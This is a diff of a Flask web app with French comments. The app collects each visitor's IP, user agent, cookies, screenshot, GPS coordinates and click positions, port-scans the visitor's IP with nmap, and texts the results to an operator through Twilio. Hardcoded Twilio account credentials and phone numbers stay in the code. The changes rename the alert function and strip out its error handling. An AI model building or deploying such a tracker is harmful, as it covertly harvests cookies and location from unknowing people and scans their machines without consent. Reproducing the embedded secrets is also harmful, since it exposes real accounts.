@@ -3,15 +3,14 @@ from twilio.rest import Client
 import requests
 import socket
 import nmap
-import html2canvas
 
 app = Flask(__name__)
 
 # Twilio credentials
-account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'  # Remplace avec ton SID Twilio
-auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'  # Remplace avec ton Token Twilio
-from_number = '+12524866318'  # Remplace avec ton numéro Twilio
-to_number = '+33635960569'  # Remplace avec ton numéro de destination
+account_sid = 'AC2ef2bd5bd5146f76f586d2c577159f90'
+auth_token = '5ce2eed95742af1667bb5c8b8528cf0c'
+from_number = '+12524866318'
+to_number = '+33635960569'
 
 client = Client(account_sid, auth_token)
 
@@ -30,8 +29,8 @@ def scan_ports(ip):
     open_ports = nm[ip].all_tcp()  # Liste tous les ports TCP ouverts
     return open_ports
 
-# Fonction d'envoi d'alertes par SMS via Twilio
-def send_sms(ip, user_agent, cookies, screenshot, latitude, longitude, click_x, click_y):
+# Fonction d'envoi d'alertes par SMS
+def send_alert(ip, user_agent, cookies, screenshot, latitude, longitude, click_x, click_y):
     location = get_geolocation(ip)
     ports = scan_ports(ip)
 
@@ -48,16 +47,12 @@ def send_sms(ip, user_agent, cookies, screenshot, latitude, longitude, click_x, 
     Localisation : {location}
     """
     
-    # Envoie de l'alerte par SMS via Twilio
-    try:
-        message = client.messages.create(
-            body=message_body,
-            from_=from_number,
-            to=to_number
-        )
-        print(f"[+] SMS envoyé : {message.sid}")
-    except Exception as e:
-        print(f"[!] Erreur envoi SMS : {e}")
+    # Envoi de l'alerte par SMS
+    message = client.messages.create(
+        body=message_body,
+        from_=from_number,
+        to=to_number
+    )
 
 @app.route('/')
 def index():
@@ -115,8 +110,8 @@ def log():
     click_x = data.get('click_x')
     click_y = data.get('click_y')
 
-    # Envoie de l'alerte par SMS via Twilio
-    send_sms(ip, user_agent, cookies, screenshot, latitude, longitude, click_x, click_y)
+    # Envoie de l'alerte par SMS
+    send_alert(ip, user_agent, cookies, screenshot, latitude, longitude, click_x, click_y)
 
     return jsonify({"status": "ok"})
 
